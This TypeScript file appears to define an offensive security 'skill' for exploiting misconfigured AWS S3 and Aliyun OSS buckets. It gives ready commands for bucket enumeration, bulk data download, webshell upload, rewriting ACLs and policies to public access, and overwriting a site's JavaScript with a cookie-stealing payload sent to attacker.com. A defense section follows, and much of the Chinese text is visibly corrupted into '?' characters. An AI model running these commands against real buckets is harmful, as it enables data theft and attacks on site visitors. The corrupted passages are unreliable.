/**
 * HOS-Sec-Engine V2 - S3/OSS Bucket Misconfiguration Exploitation
 * S3/OSS Bucket 配置错误利用专项 Skill
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const s3MisconfigSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'cloud-s3-001',
            name: 'S3/OSS Bucket Misconfiguration Exploitation',
            category: 'cloud',
            subCategory: 's3',
            riskLevel: 'critical',
            confidence: 0.92,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: [
                's3',
                'oss',
                'bucket-misconfiguration',
                'public-bucket',
                'cloud-storage',
                'acl-abuse',
                'policy-bypass',
                'data-exposure',
                'aws',
                'alibaba-cloud',
                'cloudfront-oai',
                'file-upload',
            ],
        },
        trigger: {
            scenarios: [
                '目标使用 AWS S3、阿里云 OSS、腾讯云 COS 等云存储服务作为静态资源托',
                'Web 应用从云存储桶加载前端资源（JS/CSS/图片），URL 中包?bucket 名称',
                '应用允许用户上传文件到云存储桶，且未严格校验上传路径和文件类',
                '发现 bucket 域名格式?{bucket}.s3.amazonaws.com ?{bucket}.oss-cn-hangzhou.aliyuncs.com',
                '前端代码硬编码了 S3/OSS bucket URL 或使用了 SDK 直传',
                'CloudFront/OSS CDN 回源?S3/OSS bucket，可能存?OAI 绕过',
                'CI/CD 流水线将构建产物或配置文件上传到云存储桶',
            ],
            keywords: [
                's3',
                'oss',
                'bucket',
                'cloud storage',
                'object storage',
                's3.amazonaws.com',
                'aliyuncs.com',
                'public read',
                'public write',
                'acl',
                'bucket policy',
                'cloudfront',
                'oai',
                'origin access identity',
                '列举文件',
                '桶策',
                '公开读写',
                's3fs',
                'aws s3 cp',
                'ossutil',
            ],
            aliases: [
                'public s3 bucket',
                'open oss bucket',
                'bucket enumeration',
                's3 acl misconfiguration',
                'oss public bucket',
                'cloud storage exposure',
                's3 bucket takeover',
                'cos misconfiguration',
            ],
            indicators: [
                'HTTP 200 响应中列?bucket 内文件（ListBucket 返回 XML',
                'HTTP 403 ?AccessDenied 消息中暴?bucket 策略细节',
                'PUT 请求成功上传文件?bucket（HTTP 200），确认可写',
                '响应头包?x-amz-request-id ?x-oss-request-id',
                'CORS 配置允许任意 Origin（Access-Control-Allow-Origin: *',
                'CloudFront Distribution 回源配置暴露 bucket 域名',
            ],
        },
        knowledge: {
            description: '云存储桶（S3/OSS/COS）配置错误是最常见的云安全问题之一。当 bucket ?ACL ?bucket policy 被错误配置为公开读写时，攻击者可以直接枚举、下载、上传甚至删?bucket 中的所有对象。更严重的场景是，攻击者利用可?bucket 覆盖应用的关键文件（?JS 文件、配置文件）实现供应链攻击，或上传恶意文件通过应用处理链触?RCE。在阿里?OSS 中，"公共??公共读写"权限?bucket 可以通过 ossutil 工具直接操作，危害极大。此外，CloudFront Origin Access Identity (OAI) 配置错误可导?bucket 虽然设置?OAI 限制但仍可通过 S3 直接端点公开访问',
            symptoms: [
                '访问 https://{bucket}.s3.amazonaws.com/ ?https://{bucket}.oss-{region}.aliyuncs.com/ 返回 XML 格式的文件列',
                'curl PUT 请求可以成功上传文件?bucket 任意路径',
                'bucket 名称?DNS 中可解析（S3 bucket 名称全局唯一，可通过 DNS 探测是否存在',
                '前端 JS 源码中包?S3/OSS ?AccessKey 或签?URL 生成逻辑',
                'CORS 配置过于宽松，允许任意域读取 bucket 内容',
                'bucket 策略中包?"Principal": "*" ?Action 包含 s3:GetObject ?s3:PutObject',
            ],
            rootCauses: [
                '开发者创?bucket 时误设为 "Public Read/Write" ?"Public Access" 以方便开发调试，上线后未收回',
                '使用 AWS 管理控制台创?bucket 时默?ACL 策略不当?023?月前 S3 默认关闭公共访问，但已有 bucket 不受影响',
                'bucket policy 中错误地设置了宽松的 Condition 条件，导致权限控制形同虚',
                '使用第三方工具（?s3cmd、aws-cli）配?bucket 时参数错',
                '阿里?OSS "Block Public Access" 功能未启用，bucket ACL 默认?private 但被手动改为 public-read',
                'CloudFront OAI 配置后未移除 S3 bucket 上的 public read 权限，导?OAI 绕过',
                'IAM 策略?s3:* 权限过宽，允许任?IAM 用户修改 bucket policy ?ACL',
                '对象标签 (object tagging) 或基于标签的访问控制配置错误',
            ],
            observations: [
                'S3 bucket 名称是全局唯一的，可通过暴力枚举 DNS 记录（{name}.s3.amazonaws.com）发现目?bucket',
                '阿里?OSS ?bucket 名称在区域内唯一，可通过 ossutil ls 配合字典枚举',
                '很多企业?bucket 名称遵循命名模式，如 {company}-assets、{company}-prod-data、{company}-backup',
                'S3 bucket 如果配置?Website Hosting，可以通过 Website 端点绕过部分 ACL 限制',
                '覆盖前端 JS 文件（如 main.js、app.js）可以实现持久的 XSS 攻击，影响所有访问',
                '阿里?OSS 支持 STS 临时凭证，如果泄露可直接操作 bucket',
                '某些 bucket 设置?IP 白名单，但白名单仅针?bucket policy，ACL 可能仍然公开',
                'CloudFront 自定义域名可能指?S3 bucket，通过 CNAME 记录可反向查?bucket 名称',
                'S3 Object Lambda ?S3 Access Points 提供了额外的访问控制层，但配置复杂容易出?',
            ],
            commonMistakes: [
                '只测试了 S3 REST API 端点，忽略了 Website 端点（{bucket}.s3-website-{region}.amazonaws.com',
                '未测试不同区域的 S3 端点（bucket 可能在非默认区域',
                '遇到 403 就认?bucket 安全，但 403 可能仅表?ListBucket 被拒绝，GetObject 可能仍然允许',
                '未尝试上传小文件测试可写性，仅测试了读取权限',
                '忽略?bucket 策略中的 Condition 字段可能被绕过的情况（如 aws:SourceIp 可通过内网 SSRF 绕过',
                '未检?CloudFront Distribution ?Origin 配置，可能暴露私?bucket 的访问方',
                '只测试了匿名访问，未测试使用已知凭证（如泄露?AccessKey）后的权限提?',
            ],
            notes: [
                '发现 bucket 后，优先枚举文件列表寻找敏感信息（配置文件、密钥、备份文件、数据库 dump',
                '可写 bucket 的攻击价值远大于只读 bucket —?可以覆盖关键文件实现供应链攻',
                '部分 bucket 设置?"Requester Pays"，访问需要额?header，不影响利用但需要知',
                'S3 bucket 版本控制（Versioning）开启后，删除文件实际是创建删除标记，历史版本仍可访',
                '利用 bucket 进行钓鱼攻击：上传伪造的登录页面，利?bucket 域名?HTTPS 增加可信',
                '监控 bucket 的最佳方式是开?S3 Access Logging ?CloudTrail 数据事件',
            ],
        },
        action: {
            checklist: [
                '从应用前端源码、JS 文件、网络请求中提取 bucket 名称和区域信',
                '通过 DNS 枚举确认 bucket 是否存在（{name}.s3.amazonaws.com',
                '测试 bucket 读取权限：访?https://{bucket}.s3.{region}.amazonaws.com/',
                '测试 bucket 列举权限：访?https://{bucket}.s3.amazonaws.com/?list-type=2',
                '如果返回文件列表，分析文件类型和内容，寻找敏感数',
                '测试 bucket 写入权限：使?PUT 上传测试文件验证是否可写',
                '检?bucket ACL：aws s3api get-bucket-acl --bucket {bucket}',
                '检?bucket policy：aws s3api get-bucket-policy --bucket {bucket}',
                '检?CloudFront Distribution 是否回源到此 bucket，尝?OAI 绕过',
                '测试 CORS 配置：aws s3api get-bucket-cors --bucket {bucket}',
                '寻找敏感文件：配置文件（.env, config.json）、密钥文件、数据库备份、日志文',
                '如果 bucket 可写，考虑覆盖关键 JS 文件实现 XSS 或上传恶意文',
                '测试阿里?OSS：使?ossutil ls oss://{bucket}/ 检查访问权?',
            ],
            techniques: [
                'DNS 枚举发现 S3 bucket：使用工具如 slurp、s3scanner、BucketFinder',
                'S3 列举绕过：当 ListBucket 被拒时，通过已知文件名模式猜测对象路',
                'ACL 直接修改：当?PutBucketAcl 权限时，可修?bucket 为公开访问',
                'bucket policy 注入：当?PutBucketPolicy 权限时，可添加允许自己的策略',
                'CloudFront OAI 绕过：直接通过 S3 端点访问绕过 CloudFront ?OAI 限制',
                '签名 URL 伪造：如果获取到签名算法参数，可自行生成有效签?URL',
                'STS 凭证滥用：利用泄露的 STS 临时凭证操作 bucket',
                '预签?URL 上传：利用服务端生成的预签名 URL 直接上传文件?bucket',
                '子域名接管：删除 bucket 后如?Route53 记录未删除，可注册同?bucket 接管流量',
                '阿里?OSS 公共 bucket 直接下载：ossutil cp oss://{bucket}/path/to/file ./local',
            ],
            examples: [
                {
                    name: 'S3 Bucket 公开枚举与文件下',
                    description: '利用 S3 bucket 公开读取权限，列举并下载 bucket 中的所有文',
                    content: '# 1. 确认 bucket 可访问（REST API 端点）\n' +
                        'curl https://target-bucket.s3.amazonaws.com/\n' +
                        '# 返回 XML 格式的文件列表表示可列举\n\n' +
                        '# 2. 使用 list-type=2 获取更详细的文件列表\n' +
                        'curl "https://target-bucket.s3.amazonaws.com/?list-type=2&max-keys=1000"\n\n' +
                        '# 3. 分页获取所有文件（使用 ContinuationToken）\n' +
                        'curl "https://target-bucket.s3.amazonaws.com/?list-type=2&continuation-token={token}"\n\n' +
                        '# 4. 按前缀过滤（如只查?config/ 目录）\n' +
                        'curl "https://target-bucket.s3.amazonaws.com/?list-type=2&prefix=config/"\n\n' +
                        '# 5. 批量下载所有文件\n' +
                        'aws s3 cp --no-sign-request s3://target-bucket/ ./downloaded/ --recursive\n\n' +
                        '# 6. 使用 s5cmd 工具加速下载\n' +
                        's5cmd --no-sign-request cp "s3://target-bucket/*" ./downloaded/',
                },
                {
                    name: 'S3 Bucket 可写测试与恶意文件上',
                    description: '测试 S3 bucket 是否可写，并上传恶意文件进行验证',
                    content: '# 1. 测试 PUT 请求上传文件\n' +
                        'curl -X PUT -d "test content" \\\n' +
                        '  -H "Host: target-bucket.s3.amazonaws.com" \\\n' +
                        '  https://target-bucket.s3.amazonaws.com/test-write.txt\n\n' +
                        '# 2. 确认文件已上传成功\n' +
                        'curl https://target-bucket.s3.amazonaws.com/test-write.txt\n\n' +
                        '# 3. 使用 AWS CLI 上传（如果配置了凭证）\n' +
                        'aws s3 cp malicious.js s3://target-bucket/static/js/main.js --acl public-read\n\n' +
                        '# 4. 上传 webshell 到网站托?bucket\n' +
                        'aws s3 cp shell.php s3://target-bucket/shell.php --acl public-read\n\n' +
                        '# 5. 覆盖前端 JS 实现持久 XSS\n' +
                        'echo "new Image().src=`https://attacker.com/?c=${document.cookie}`" | \\\n' +
                        '  aws s3 cp - s3://target-bucket/static/js/app.js --acl public-read --content-type "application/javascript"\n\n' +
                        '# 6. 上传到阿里云 OSS（使?ossutil）\n' +
                        'ossutil cp malicious.txt oss://target-bucket/uploads/malicious.txt',
                },
                {
                    name: 'S3 Bucket ACL ?Policy 检查与修改',
                    description: '检?bucket ?ACL ?Bucket Policy 配置，并在有权限时修改为公开访问',
                    content: '# 1. 获取 Bucket ACL\n' +
                        'aws s3api get-bucket-acl --bucket target-bucket\n' +
                        '# 关注 Grantee URI 中是否包?http://acs.amazonaws.com/groups/global/AllUsers\n\n' +
                        '# 2. 获取 Bucket Policy\n' +
                        'aws s3api get-bucket-policy --bucket target-bucket --output text | jq\n\n' +
                        '# 3. 如果?PutBucketAcl 权限，修改为公开读\n' +
                        'aws s3api put-bucket-acl --bucket target-bucket \\\n' +
                        '  --acl public-read\n\n' +
                        '# 4. 如果?PutBucketPolicy 权限，添加开放策略\n' +
                        'aws s3api put-bucket-policy --bucket target-bucket --policy \'{\n' +
                        '  "Version": "2012-10-17",\n' +
                        '  "Statement": [{\n' +
                        '    "Sid": "PublicRead",\n' +
                        '    "Effect": "Allow",\n' +
                        '    "Principal": "*",\n' +
                        '    "Action": ["s3:GetObject", "s3:ListBucket"],\n' +
                        '    "Resource": [\n' +
                        '      "arn:aws:s3:::target-bucket",\n' +
                        '      "arn:aws:s3:::target-bucket/*"\n' +
                        '    ]\n' +
                        '  }]\n' +
                        '\'}\'\n\n' +
                        '# 5. 检?Object ACL（对象级别的 ACL 可能覆盖 bucket 策略）\n' +
                        'aws s3api get-object-acl --bucket target-bucket --key sensitive-file.txt\n\n' +
                        '# 6. 列出所有启用了公共访问?bucket\n' +
                        'aws s3api get-public-access-block --bucket target-bucket',
                },
                {
                    name: 'CloudFront OAI 绕过直接访问 S3',
                    description: '当应用通过 CloudFront OAI 访问私有 S3 bucket 时，尝试直接通过 S3 端点绕过 OAI 限制',
                    content: '# 1. 通过 CloudFront 域名发现 S3 bucket（查看响应头或错误信息）\n' +
                        'curl -I https://d123456789.cloudfront.net/\n' +
                        '# 查找 x-amz-cf-id 头或在错误页面中?bucket 信息\n\n' +
                        '# 2. 直接访问 S3 REST 端点（绕?CloudFront OAI）\n' +
                        'curl https://target-bucket.s3.amazonaws.com/\n' +
                        'curl https://target-bucket.s3.us-east-1.amazonaws.com/\n\n' +
                        '# 3. 尝试 Website 端点（可能有不同的访问控制）\n' +
                        'curl http://target-bucket.s3-website-us-east-1.amazonaws.com/\n\n' +
                        '# 4. 检?CloudFront Distribution 配置\n' +
                        'aws cloudfront get-distribution --id EDFDVBD6EXAMPLE | jq \'.Distribution.DistributionConfig.Origins\'\n\n' +
                        '# 5. 如果 OAI 配置?"Restrict Bucket Access" ?S3 bucket policy 未正确设置\n' +
                        '#    可直接访?S3 端点获取内容（OAI 不阻止直?S3 访问）\n' +
                        '#    修复方法：S3 bucket policy 中只允许特定 CloudFront OAI ?canonical user ID\n\n' +
                        '# 6. 利用自定义域?CNAME 反向查找 bucket\n' +
                        'dig static.example.com CNAME\n' +
                        '# 返回 d123456789.cloudfront.net. ?进一步查 Distribution 配置',
                },
                {
                    name: '阿里?OSS 公开 Bucket 探测与利',
                    description: '针对阿里?OSS 公开 bucket 的探测、列举和下载操作',
                    content: '# 1. 确认 bucket 可访问\n' +
                        'curl https://target-bucket.oss-cn-hangzhou.aliyuncs.com/\n' +
                        '# 返回 ListBucketResult XML 表示可公开列举\n\n' +
                        '# 2. 使用 ossutil 工具列举文件\n' +
                        'ossutil ls oss://target-bucket/ -r\n' +
                        'ossutil ls oss://target-bucket/ --limit 1000\n\n' +
                        '# 3. 批量下载 bucket 内容\n' +
                        'ossutil cp oss://target-bucket/ ./local-dir/ --recursive --only-current-dir\n\n' +
                        '# 4. 获取 bucket 配置信息（如果配置了公开读）\n' +
                        'ossutil bucket-info oss://target-bucket\n' +
                        'ossutil get-acl oss://target-bucket\n\n' +
                        '# 5. 测试上传（如?bucket 为公共读写）\n' +
                        'echo "test" > test.txt\n' +
                        'ossutil cp test.txt oss://target-bucket/test-upload.txt\n\n' +
                        '# 6. 利用 STS 临时凭证访问（如果获取到）\n' +
                        'ossutil config -e oss-cn-hangzhou.aliyuncs.com \\\n' +
                        '  -i {AccessKeyId} -k {AccessKeySecret} -t {SecurityToken}\n' +
                        'ossutil ls oss://target-bucket/\n\n' +
                        '# 7. 检?bucket 是否开启了防勒索或版本控制\n' +
                        'ossutil get-bucket-versioning oss://target-bucket',
                },
                {
                    name: 'S3 Bucket 暴力枚举与发',
                    description: '通过 DNS 查询和工具批量枚举存在的 S3 bucket',
                    content: '# 1. 使用 s3scanner 工具\n' +
                        's3scanner scan -f bucket-names.txt\n' +
                        's3scanner scan --threads 50 target-bucket\n\n' +
                        '# 2. 使用 slurp 枚举\n' +
                        'slurp -d company.com -o s3-buckets.txt\n\n' +
                        '# 3. 使用 DNS 直接检查（S3 bucket 名称全局唯一）\n' +
                        'dig {bucket-name}.s3.amazonaws.com +short\n' +
                        '# 如果返回 CNAME ?s3-1-w.amazonaws.com. ?bucket 存在\n\n' +
                        '# 4. 批量 DNS 检查脚本\n' +
                        'while read bucket; do\n' +
                        '  result=$(dig +short "${bucket}.s3.amazonaws.com")\n' +
                        '  if [[ "$result" == *"s3"* ]]; then\n' +
                        '    echo "[+] Found: ${bucket}"\n' +
                        '    # 进一步测试权限\n' +
                        '    curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/"\n' +
                        '  fi\n' +
                        'done < bucket-dictionary.txt\n\n' +
                        '# 5. 使用 cloud_enum 工具枚举多云存储\n' +
                        'python3 cloud_enum.py -k company-name -t 20\n\n' +
                        '# 6. 基于公司名称的常?bucket 命名模式\n' +
                        '# {company}-assets, {company}-prod, {company}-staging\n' +
                        '# {company}-backup, {company}-data, {company}-logs\n' +
                        '# {company}-frontend, {company}-uploads, {company}-media',
                },
                {
                    name: 'S3 Bucket 签名 URL 绕过与伪',
                    description: '利用预签?URL 或签名算法漏洞绕过访问控',
                    content: '# 1. 预签?URL 包含访问密钥和签名，直接访问可绕?bucket 策略\n' +
                        '# 格式: https://bucket.s3.amazonaws.com/key?AWSAccessKeyId=xxx&Signature=xxx&Expires=xxx\n\n' +
                        '# 2. 如果获取到签?URL 但已过期，可分析签名算法重新生成\n' +
                        '# AWS Signature V4 计算:\n' +
                        '# signing key = HMAC-SHA256("AWS4" + SecretKey, Date)\n' +
                        '# string to sign = HTTP_METHOD + \\n + URI + \\n + QUERY_STRING + \\n + HEADERS + \\n + PAYLOAD_HASH\n\n' +
                        '# 3. 使用 AWS CLI 生成预签?URL（如果有凭证）\n' +
                        'aws s3 presign s3://target-bucket/sensitive-file.txt --expires-in 3600\n\n' +
                        '# 4. 测试签名 URL 的参数可篡改性\n' +
                        '# 修改 Content-Type ?Content-Disposition 可能绕过下载限制\n' +
                        'curl "https://bucket.s3.amazonaws.com/file?response-content-type=application/octet-stream"\n\n' +
                        '# 5. 检查签?URL 是否包含 versionId 参数\n' +
                        '# 如果有，可能访问到对象的旧版本（即使当前版本已修复或删除）\n\n' +
                        '# 6. 阿里?OSS 签名 URL 格式\n' +
                        'https://bucket.oss-cn-hangzhou.aliyuncs.com/file?OSSAccessKeyId=xxx&Signature=xxx&Expires=xxx',
                },
            ],
        },
        validation: {
            indicators: [
                '访问 bucket 根路径返?XML 格式?ListBucketResult ?ListBucketResult 内容',
                'PUT 请求返回 HTTP 200 且无错误，确?bucket 可写',
                '下载的文件包含敏感信息（配置文件、密钥、数据库凭证、用户数据）',
                'bucket ACL ?Grant 包含 AllUsers ?AuthenticatedUsers',
                'bucket policy ?Principal ?"*" ?Effect ?Allow',
                'CORS 配置允许 Origin: * ?Methods 包含 GET/PUT/DELETE',
            ],
            successSigns: [
                '成功列举 bucket 内所有文件和目录结构',
                '成功下载 bucket 中的敏感文件（配置文件、数据库备份、密钥等',
                '成功上传文件?bucket 并能通过 URL 访问',
                '确认 bucket ACL ?policy 中存在公开访问配置',
                '通过 CloudFront OAI 绕过直接访问?S3 私有 bucket 内容',
                '发现并枚举多个关?bucket（备份、日志、开发环境等?',
            ],
            falsePositiveSigns: [
                'bucket 返回 404（NoSuchBucket）表?bucket 不存在而非配置错误',
                '403 AccessDenied 且错误信息明确说明权限不足（非配置错误）',
                'bucket 配置?Requester Pays，需要额?header 才能访问（非公开',
                '响应?XML 但为空列表（bucket 存在但确实没有文件）',
                'CloudFront 返回 403 ?S3 端点也返?403（OAI 配置正确?',
            ],
        },
        defense: {
            recommendations: [
                '启用 S3 Block Public Access（账户级别和 bucket 级别双重启用），禁止任何公开 ACL',
                '遵循最小权限原则：bucket policy 中明确指定允许的 Principal、Action ?Resource',
                '使用 CloudFront Origin Access Identity (OAI) ?Origin Access Control (OAC) 限制 bucket 只能通过 CDN 访问',
                '配置 S3 bucket policy 中的 aws:SourceIp ?aws:SourceVpc 条件限制访问来源',
                '启用 S3 版本控制?MFA Delete 防止意外或恶意删',
                '定期使用 S3 Access Analyzer 检?bucket 的公开访问状',
                '开?S3 Server Access Logging ?CloudTrail 数据事件监控所?bucket 操作',
                '对敏?bucket 启用默认加密（SSE-S3 ?SSE-KMS',
                '使用 IAM Access Analyzer 定期审计 bucket policy ?ACL 配置',
                '阿里?OSS：启?防勒?功能，配?OSS 高防 IP 限制访问来源',
                '禁止在客户端代码中硬编码 AccessKey，使?STS 临时凭证或预签名 URL',
                '实施 bucket 命名规范并在 CI/CD 中自动检?bucket 权限配置',
            ],
            mitigations: [
                '立即关闭所有不必要的公开 bucket 访问权限',
                '使用 aws s3api put-public-access-block 批量修复',
                '审查 CloudTrail 日志，确认是否有未授权的 bucket 访问或数据泄',
                '轮换所有可能泄露的 AccessKey ?SecretKey',
                '对可?bucket 中上传的文件进行完整性校验和恶意代码扫描',
                '如果 bucket 曾被用于 XSS 攻击，清除所有可疑文件并通知受影响用',
                '启用 S3 Object Lock 防止关键文件被覆盖或删除',
            ],
            references: [
                'https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html',
                'https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html',
                'https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-points.html',
                'https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html',
                'https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer.html',
                'https://help.aliyun.com/zh/oss/user-guide/control-access-to-oss-resources',
                'https://help.aliyun.com/zh/oss/user-guide/configure-block-public-access',
                'https://cloud.google.com/storage/docs/access-control/making-data-public',
                'https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Test_Cloud_Storage',
                'https://securitylabs.datadoghq.com/articles/exploring-container-registry-security-part-one/',
            ],
        },
        quality: {
            confidence: 0.92,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        enabled: true,
    },
];
